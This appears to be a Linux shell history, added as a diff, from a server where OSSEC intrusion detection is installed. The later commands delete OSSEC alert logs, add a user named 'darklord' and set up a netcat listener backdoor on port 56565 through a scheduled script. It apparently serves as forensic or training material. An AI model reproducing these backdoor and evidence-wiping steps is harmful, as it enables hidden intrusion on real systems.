@@ -1,0 +1,85 @@
+    1  sudo apt-get install inotify-tools build-essential
+    2  wget -U ossec http://www.ossec.net/files/ossec-hids-2.8.1.tar.gz
+    3  wget https://github.com/ossec/ossec-hids/archive/3.1.0.tar.gz
+    4  tar -xvzf 3.1.0.tar.gz
+    5  cd  ossec-hids-3.1.0
+    6  sudo ./install.sh
+    7  cd ..
+    8  wget https://github.com/ossec/ossec-wui/archive/master.zip
+    9  unzip master.zip
+   10  mv ossec-wui-master /var/www/html/ossec
+   11  apt-get install apache2
+   12  mv ossec-wui-master /var/www/html/ossec
+   13  cd /var/www/html/ossec
+   14  ./setup.sh
+   15  apt-get install build-essential make libssl-dev git
+   16  apt-get install mysql-server libmysqlclient-dev mysql-client apache2 php5 libapache2-mod-php5 php5-mysql php5-curl php5-gd php5-intl php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-ming php5-ps php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl
+   17  mysql -u root -p
+   18  mysql -u root -p ossec < src/os_dbd/mysql.schema
+   19  sudo ./setup.sh 
+   20  /var/ossec/bin/ossec-control status
+   21  /var/ossec/bin/ossec-control stop
+   22  sudo ./setup.sh 
+   23  apt-get install apache2-utils
+   24  sudo ./setup.sh 
+   25  systemctl restart apache2
+   26  service apache2 restart
+   27  /var/ossec/bin/ossec-control start
+   28  history
+   29  su ubuntu
+   30  cd     /var/ossec/
+   31  lssssss
+   32  ls
+   33  cd logs
+   34  ls
+   35  cd alerts/
+   36  ls
+   37  cd 2020/
+   38  ls
+   39  rm -rf Jun/
+   40  cd Sep/
+   41  ls
+   42  rm -rf ossec-alerts-20.log 
+   43  rm -rf ossec-alerts-21.log 
+   44  ls
+   45  apt-get install lamp
+   46  apt-get install xampp
+   47  apt-get install pypi
+   48  apt-get install python27
+   49  apt-get install docker
+   50  suuuuuuu ubuntu
+   51  su ubuntu
+   52  history
+   53  ifconfiggggg
+   54  ifconfig
+   55  dockerrrrrr
+   56  docke
+   57  docker
+   58  apt-get     install docker
+   59  cd /var/log
+   60  ls
+   61  su ubuntu
+   62  adduser darklord
+   63  cat <<- "EOF" > /etc/darklord.sh
+   64  #!/bin/bash
+   65  cp /bin/nc /tmp/remotesec
+   66  echo "/tmp/remotesec -k -l 56565" > remotesec
+   67  chmod +x remotesec
+   68  # execute the command at a specific time (now)
+   69  at -f remotesec now &
+   70  EOF
+   71  cd /etc/
+   72  less darklord.sh 
+   73  chmod +x darklord.sh 
+   74  ls
+   75  crontab -e
+   76  crontab -l
+   77  at -f darklord.sh now &
+   78  netstat -antp
+   79  history
+   80  exit
+   81  xit
+   82  exit
+   83  passwd
+   84  ifconfig
+
